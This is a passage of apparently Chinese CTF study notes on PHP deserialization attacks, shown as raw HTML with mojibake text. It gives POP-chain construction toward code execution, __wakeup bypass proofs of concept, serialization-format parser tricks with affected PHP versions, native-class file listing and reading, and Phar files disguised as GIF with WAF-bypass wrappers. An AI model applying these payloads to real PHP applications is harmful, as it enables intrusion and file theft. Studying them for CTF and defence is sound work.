class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;message . <span class="hljs-string">&quot;, &quot;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br><span class="hljs-comment">// __sleep() æ–¹æ³•åœ¨å¯¹è±¡åºåˆ—åŒ–ä¹‹å‰è°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// ä»…è¿”å›éœ€è¦åºåˆ—åŒ–çš„å±æ€§</span><br>        <span class="hljs-keyword">return</span> [<span class="hljs-string">&#x27;name&#x27;</span>];<br>    &#125;<br><span class="hljs-comment">// __wakeup() æ–¹æ³•åœ¨å¯¹è±¡ååºåˆ—åŒ–ä¹‹åè°ƒç”¨</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// é‡æ–°åˆå§‹åŒ–æˆ–æ¢å¤å¯¹è±¡çš„çŠ¶æ€</span><br>        <span class="hljs-variable language_">$this</span>-&gt;sessionData = <span class="hljs-string">&quot;Session data restored&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">// åˆ›å»ºç±»çš„å®ä¾‹</span><br><span class="hljs-variable">$myObject</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();<br><span class="hljs-comment">// è®¾ç½®ä¸å­˜åœ¨çš„å±æ€§</span><br><span class="hljs-variable">$myObject</span>-&gt;name = <span class="hljs-string">&#x27;ChatGPT&#x27;</span>;<br><span class="hljs-comment">// è®¿é—®ä¸å­˜åœ¨çš„å±æ€§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;name . PHP_EOL;<br><span class="hljs-variable">$nonExistent</span> = <span class="hljs-variable">$myObject</span>-&gt;age;<br><span class="hljs-comment">// è®¿é—®æœªè®¾ç½®çš„å±æ€§</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>-&gt;age . PHP_EOL;<br><span class="hljs-comment">// ä½¿ç”¨ isset() æ£€æŸ¥å±æ€§æ˜¯å¦å­˜åœ¨</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$myObject</span>-&gt;name)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±æ€§ &#x27;name&#x27; å­˜åœ¨ã€‚&quot;</span> . PHP_EOL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å±æ€§ &#x27;name&#x27; ä¸å­˜åœ¨ã€‚&quot;</span> . PHP_EOL;<br>&#125;<br><span class="hljs-comment">// åˆ é™¤å±æ€§</span><br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$myObject</span>-&gt;name);<br><span class="hljs-comment">// ç›´æ¥è¾“å‡ºå¯¹è±¡ï¼Œè‡ªåŠ¨è°ƒç”¨ __toString()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>;<br><span class="hljs-comment">// ç›´æ¥è°ƒç”¨å¯¹è±¡ï¼Œè‡ªåŠ¨è°ƒç”¨ __invoke()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$myObject</span>(<span class="hljs-string">&#x27;ChatGPT&#x27;</span>);<br><span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡__sleep() æ–¹æ³•è¿”å›ä¸€ä¸ªåŒ…å« &#x27;name&#x27; çš„æ•°ç»„ï¼Œè¡¨ç¤ºåªæœ‰ name å±æ€§ä¼šè¢«åºåˆ—åŒ–ã€‚serialize($myObject) æ—¶ï¼Œpassword å’Œ sessionData å±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰åŒ…å«åœ¨ __sleep() æ–¹æ³•è¿”å›çš„æ•°ç»„ä¸­ã€‚</span><br><span class="hljs-variable">$serializedObject</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$myObject</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$serializedObject</span>; <span class="hljs-comment">// è¾“å‡º: O:7:&quot;MyClass&quot;:1:&#123;s:8:&quot;\0MyClass\0name&quot;;s:7:&quot;ChatGPT&quot;;&#125;</span><br><span class="hljs-comment">// ååºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-variable">$unserializedObject</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serializedObject</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="ä¸‰ç§æ–¹æ³•èµ‹å€¼"><a href="#ä¸‰ç§æ–¹æ³•èµ‹å€¼" class="headerlink" title="ä¸‰ç§æ–¹æ³•èµ‹å€¼"></a>ä¸‰ç§æ–¹æ³•èµ‹å€¼</h3><ol><li><p><strong>ç›´æ¥å†™åªèƒ½å†™å­—ç¬¦ä¸²ï¼š</strong></p><ul><li><code>private $username = &#39;xxxxxx&#39;;</code></li></ul></li><li><p><strong>å¤–éƒ¨å†™æ„å›¾æŠŠç±»é‡Œçš„ <code>$a</code> å˜é‡å…¶ä»– <code>$b</code>ï¼Œè¿™æ ·å°±å†™å‡ºäº† popï¼Œå³ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SHOW;<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> CTF;<br><span class="hljs-variable">$s</span>-&gt;a = <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><ul><li>ä½†æ˜¯ä¸èƒ½å¯¹ç§æœ‰å±æ€§è¿›è¡Œèµ‹å€¼ã€‚</li></ul></li><li><p><strong>æ„é€ æ–¹æ³•èµ‹å€¼ï¼š</strong></p><ul><li>ä»¥ä¸Šç¼ºç‚¹éƒ½æ²¡äº†ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = <span class="hljs-title">new</span> <span class="hljs-title">backdoor</span>();</span><br><span class="hljs-class">&#125;</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><hr><h1 id="æ„é€ -pop-é“¾"><a href="#æ„é€ -pop-é“¾" class="headerlink" title="æ„é€  pop é“¾"></a>æ„é€  pop é“¾</h1><ul><li><strong>é‡ç‚¹æ‰¾èµ·å§‹å’Œ RCE ç»ˆç‚¹ï¼ŒæœŸé—´çš„å˜é‡èµ‹å€¼ä¸ºå˜é‡æ—¶è¦å¤–éƒ¨èµ‹å€¼ï¼Œæ™®é€šå˜é‡å°±ç›´æ¥èµ‹å€¼ã€‚</strong></li><li><strong>é“¾å­ï¼š</strong>ç»ˆç‚¹å¼€å§‹ç¼–å†™é“¾å­ï¼ŒæœŸé—´ç”¨å„ç§é­”æ³•æ–¹æ³•åˆ°èµ·ç‚¹ï¼ˆåˆ©ç”¨ <code>new</code> å…³é”®è¯å¼€å§‹ <code>construct</code>ï¼Œ<code>destruct</code>ï¼Œ<code>wakeup</code>ï¼‰ï¼Œå†æŠŠèµ·ç‚¹å¯¹è±¡åºåˆ—åŒ–ã€‚</li><li><strong>æ£€æŸ¥å°±æ˜¯ä»åå¾€å‰è¯»äº†ã€‚</strong></li></ul><h1 id="åºåˆ—åŒ–ç»•è¿‡"><a href="#åºåˆ—åŒ–ç»•è¿‡" class="headerlink" title="åºåˆ—åŒ–ç»•è¿‡"></a>åºåˆ—åŒ–ç»•è¿‡</h1><ul><li><strong>ç»•è¿‡ <code>\0</code> è„šæœ¬æˆ–åˆ©ç”¨ PHP 7.1+ çš„ç‰¹æ€§ï¼Œç›´æ¥ç”¨ <code>public</code> ç”Ÿæˆå­—ç¬¦ä¸²ä½†å®¹é”™æœºåˆ¶ã€‚</strong></li><li><strong>æŒ‡é’ˆå¼•ç”¨ï¼š</strong><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$b</span>-&gt;a1 =&amp; <span class="hljs-variable">$b</span>-&gt;a2;<br><span class="hljs-variable">$a</span> = <span class="hljs-number">10</span>;<br><span class="hljs-variable">$b</span> = &amp;<span class="hljs-variable">$a</span>; <span class="hljs-comment">// $b æ˜¯ $a çš„å¼•ç”¨</span><br><span class="hljs-variable">$b</span> = <span class="hljs-number">20</span>;  <span class="hljs-comment">// æ”¹å˜ $b ä¹Ÿä¼šæ”¹å˜ $a</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;  <span class="hljs-comment">// è¾“å‡º 20</span><br></code></pre></td></tr></table></figure></li><li><strong>ç•¸å½¢å­—ç¬¦ä¸²</strong> <ul><li><strong>ç»•è¿‡ <code>wakeup</code>ã€‚</strong></li></ul></li><li><strong>åˆ©ç”¨å°†å±æ€§å€¼å˜å¤§ã€‚</strong></li></ul><h1 id="ä½¿ç”¨-C-ä»£æ›¿-O"><a href="#ä½¿ç”¨-C-ä»£æ›¿-O" class="headerlink" title="ä½¿ç”¨ C ä»£æ›¿ O"></a>ä½¿ç”¨ C ä»£æ›¿ O</h1><h3 id="é€‚ç”¨ç‰ˆæœ¬ï¼š"><a href="#é€‚ç”¨ç‰ˆæœ¬ï¼š" class="headerlink" title="é€‚ç”¨ç‰ˆæœ¬ï¼š"></a>é€‚ç”¨ç‰ˆæœ¬ï¼š</h3><ul><li><code>5.3.0 - 5.3.29</code></li><li><code>5.4.0 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.40</code></li><li><code>7.0.0 - 7.0.33</code></li><li><code>7.1.0 - 7.1.33</code></li><li><code>7.2.0 - 7.2.34</code></li><li><code>7.3.0 - 7.3.28</code></li><li><code>7.4.0 - 7.4.16</code></li><li><code>8.0.0 - 8.0.3</code></li><li><strong>åªèƒ½æ‰§è¡Œ <code>construct()</code> å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹ï¼Œç„¶åææ„å‡½æ•°æœ€åæ‰§è¡Œã€‚</strong></li></ul><h3 id="åºåˆ—åŒ–æœºåˆ¶æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å¯¹è±¡å¼•ç”¨ï¼š"><a href="#åºåˆ—åŒ–æœºåˆ¶æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å¯¹è±¡å¼•ç”¨ï¼š" class="headerlink" title="åºåˆ—åŒ–æœºåˆ¶æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å¯¹è±¡å¼•ç”¨ï¼š"></a>åºåˆ—åŒ–æœºåˆ¶æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å¯¹è±¡å¼•ç”¨ï¼š</h3><ul><li><code>7.0.0 - 7.0.14</code></li><li><code>7.1.0</code></li><li><code>5.4.14 - 5.4.45</code></li><li><code>5.5.0 - 5.5.38</code></li><li><code>5.6.0 - 5.6.29</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/iLSA7</span><br><span class="hljs-comment">//https://bugs.php.net/bug.php?id=73367</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span> </span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;ryat = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Not a serializable object&quot;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;ryat == <span class="hljs-number">1</span>) &#123;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&#x27;dtor!&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$poc</span> = <span class="hljs-string">&#x27;O:3:&quot;obj&quot;:2:&#123;s:4:&quot;ryat&quot;;i:1;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;&#125;&#x27;</span>;<span class="hljs-comment">//æ„é€ ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­ ryat è¢«è®¾ç½®ä¸º 1ï¼Œç„¶åè®©å¯¹è±¡çš„å¦ä¸€ä¸ªå±æ€§é€šè¿‡å¼•ç”¨æŒ‡å‘ ryat __wakeup() ä¿®æ”¹äº† ryatï¼Œä½†ç”±äºå¼•ç”¨çš„å­˜åœ¨ï¼Œè¿™ä¸ªä¿®æ”¹åœ¨æŸäº›åœ°æ–¹ä¸èµ·ä½œç”¨ï¼Œä»è€Œåœ¨ __destruct() ä¸­æˆåŠŸè§¦å‘äº†ä½ åŸæœ¬ä¸å¸Œæœ›è¢«è§¦å‘çš„ä»£ç ã€‚</span><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$poc</span>);<br></code></pre></td></tr></table></figure></li><li><strong>å¤šå†™ä¸€ä¸ª <code>i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:1;&#125;</code> å†æ”¹å¯¹è±¡æ•°ä»¿ç…§ä»¥ä¸Šã€‚</strong></li></ul><h3 id="åˆ©ç”¨-fastdestruct-æœºåˆ¶è®©-destruct-è·‘åˆ°å‰é¢å»ï¼š"><a href="#åˆ©ç”¨-fastdestruct-æœºåˆ¶è®©-destruct-è·‘åˆ°å‰é¢å»ï¼š" class="headerlink" title="åˆ©ç”¨ fastdestruct æœºåˆ¶è®© destruct è·‘åˆ°å‰é¢å»ï¼š"></a>åˆ©ç”¨ <code>fastdestruct</code> æœºåˆ¶è®© <code>destruct</code> è·‘åˆ°å‰é¢å»ï¼š</h3><ul><li><strong>ä¸€èˆ¬åˆ æœ€åçš„ <code>&#125;</code> å°±è¡Œã€‚</strong></li></ul><h1 id="å­—ç¬¦-O-ç»•è¿‡"><a href="#å­—ç¬¦-O-ç»•è¿‡" class="headerlink" title="å­—ç¬¦ O ç»•è¿‡"></a>å­—ç¬¦ O ç»•è¿‡</h1><h3 id="æ¡ä»¶ï¼š"><a href="#æ¡ä»¶ï¼š" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h3><ul><li><code>&lt;7.1.33</code></li></ul><h3 id="æµ‹è¯•è„šæœ¬ï¼š"><a href="#æµ‹è¯•è„šæœ¬ï¼š" class="headerlink" title="æµ‹è¯•è„šæœ¬ï¼š"></a>æµ‹è¯•è„šæœ¬ï¼š</h3><ul><li><a href="https://3v4l.org/YclXi">https://3v4l.org/YclXi</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YclXi</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:+1:&quot;C&quot;:0:&#123;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="å­—ç¬¦-iã€d-ç»•è¿‡"><a href="#å­—ç¬¦-iã€d-ç»•è¿‡" class="headerlink" title="å­—ç¬¦ iã€d ç»•è¿‡"></a>å­—ç¬¦ iã€d ç»•è¿‡</h1><h3 id="æ¡ä»¶ï¼š-1"><a href="#æ¡ä»¶ï¼š-1" class="headerlink" title="æ¡ä»¶ï¼š"></a>æ¡ä»¶ï¼š</h3><ul><li><code>&lt;8.0.3</code> ï¼ˆå…¨ç‰ˆæœ¬ï¼‰</li></ul><h3 id="æµ‹è¯•è„šæœ¬ï¼š-1"><a href="#æµ‹è¯•è„šæœ¬ï¼š-1" class="headerlink" title="æµ‹è¯•è„šæœ¬ï¼š"></a>æµ‹è¯•è„šæœ¬ï¼š</h3><ul><li><a href="https://3v4l.org/SJm2g">https://3v4l.org/SJm2g</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="åˆ©ç”¨æ•°ç»„ç‰¹æ€§"><a href="#åˆ©ç”¨æ•°ç»„ç‰¹æ€§" class="headerlink" title="åˆ©ç”¨æ•°ç»„ç‰¹æ€§"></a>åˆ©ç”¨æ•°ç»„ç‰¹æ€§</h1><ul><li><p><strong>æ•°ç»„ç‰¹æ€§ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> A, <span class="hljs-string">&#x27;açš„æ–¹æ³•&#x27;</span>];<br><span class="hljs-variable">$arr</span>(); <span class="hljs-comment">// ä¼šç›´æ¥è°ƒç”¨ a æ–¹æ³•</span><br></code></pre></td></tr></table></figure></li><li><p><strong>ååºåˆ—åŒ–åˆ©ç”¨ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();     <span class="hljs-comment">//</span><br><br>åœ¨è¿™é‡Œè¿ç”¨æ•°ç»„ç‰¹æ€§<br>          <span class="hljs-variable language_">$this</span>-&gt;mod2 =<span class="hljs-string">&quot;welcome&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;modl;<br>      &#125;<br>    <span class="hljs-variable">$arr</span> = [<span class="hljs-variable">$gf</span>, <span class="hljs-string">&#x27;get flag&#x27;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> func;<br>    <span class="hljs-variable">$f</span>-&gt;key = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="åˆ©ç”¨åŸç”Ÿç±»"><a href="#åˆ©ç”¨åŸç”Ÿç±»" class="headerlink" title="åˆ©ç”¨åŸç”Ÿç±»"></a>åˆ©ç”¨åŸç”Ÿç±»</h1><h3 id="æŸ¥çœ‹-flag-æ–‡ä»¶åï¼š"><a href="#æŸ¥çœ‹-flag-æ–‡ä»¶åï¼š" class="headerlink" title="æŸ¥çœ‹ flag æ–‡ä»¶åï¼š"></a>æŸ¥çœ‹ flag æ–‡ä»¶åï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;DirectoryIterator&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;glob:///f*&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è¯»å–æ–‡ä»¶ï¼š"><a href="#è¯»å–æ–‡ä»¶ï¼š" class="headerlink" title="è¯»å–æ–‡ä»¶ï¼š"></a>è¯»å–æ–‡ä»¶ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;SplFileObject&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;/flllaaaaggg&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GMP"><a href="#GMP" class="headerlink" title="GMP"></a>GMP</h1><h1 id="Phar-å…«è‚¡æ–‡"><a href="#Phar-å…«è‚¡æ–‡" class="headerlink" title="Phar å…«è‚¡æ–‡"></a>Phar å…«è‚¡æ–‡</h1><ul><li><strong>è¿™æ®µä»£ç å±•ç¤ºäº†å¦‚ä½•ç”Ÿæˆä¸€ä¸ª <code>.phar</code> æ–‡ä»¶ï¼Œå¹¶å°†ä»»æ„ PHP ä»£ç ä½œä¸º stubã€‚å½“è¿™ä¸ª <code>.phar</code> æ–‡ä»¶è¢«è§£ææˆ–æ‰§è¡Œæ—¶ï¼Œä»£ç ä¸­çš„ stub ä¼šè¢«æ‰§è¡Œã€‚</strong></li><li><strong>å¦‚æœ WAF è¿‡æ»¤äº† <code>phar://</code>ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ï¼š</strong><ul><li><code>compress.bzip2://phar://</code></li><li><code>compress.zlib://</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//echo ($o) å˜ä¸ºå…«è‚¡æ–‡ </span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//æ‰§è¡Œç”Ÿæˆ phar.phar æ–‡ä»¶</span><br>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;gzip phar.phar&quot;</span>);  <span class="hljs-comment">// å°† Phar æ–‡ä»¶å‹ç¼©ä¸º gzip æ ¼å¼</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;phar.phar.gz&quot;</span>));  <span class="hljs-comment">// è¾“å‡ºå‹ç¼©åçš„ Phar æ–‡ä»¶å†…å®¹å¹¶è¿›è¡Œ URL ç¼–ç ï¼Œæ ¹æ®æƒ…å†µåˆ æ‰åä¸¤è¡Œ</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="ä¼ªé€ ä¸º-GIF-çš„-Phar"><a href="#ä¼ªé€ ä¸º-GIF-çš„-Phar" class="headerlink" title="ä¼ªé€ ä¸º GIF çš„ Phar"></a>ä¼ªé€ ä¸º GIF çš„ Phar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span 